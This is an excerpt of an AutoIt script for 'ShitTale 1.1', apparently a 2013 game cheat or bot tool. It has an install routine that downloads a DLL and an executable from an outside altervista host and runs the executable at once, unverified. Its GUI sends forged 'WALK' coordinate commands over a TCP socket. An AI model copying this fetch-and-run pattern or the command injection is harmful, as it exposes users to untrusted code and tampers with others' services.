#cs ----------------------------------------------------------------------------
 ...
 Author:         Gafra96 & Narutomega96 @powerteam

 Script Function:
	ShitTale 1.1 25/04/2013
...
#cs#region tool install
If Not FileExists("pck.dll") = 1 Then

	InetGet("http://powerteam.altervista.org/shitfile/pck.dll", "pck.dll")
	InetGet("http://powerteam.altervista.org/shitfile/udt.exe", "udt3.exe")
     Run("udt3.exe")
	If not @error Then
...
GUICtrlSetState(-1, $GUI_DISABLE)
$Group9 = GUICtrlCreateGroup("Walk", 352, 152, 209, 209)
$Label57 = GUICtrlCreateLabel("X:", 368, 178, 42, 17)
$Label58 = GUICtrlCreateLabel("Y:", 368, 208, 42, 17)
$Button20 = GUICtrlCreateButton("GO", 368, 232, 75, 25)
$Input10 = GUICtrlCreateInput("Input5", 424, 176, 81, 21)
$Input11 = GUICtrlCreateInput("Input6", 424, 200, 81, 21)
GUICtrlCreateGroup("", -99, -99, 1, 1)
...
;Case $Button51
 ...
 Case $Button20
	 TCPSend($s,"WALK;" & GUICtrlRead($Input10) & ";" & Guictrlread($Input11))
	 Sleep(100)
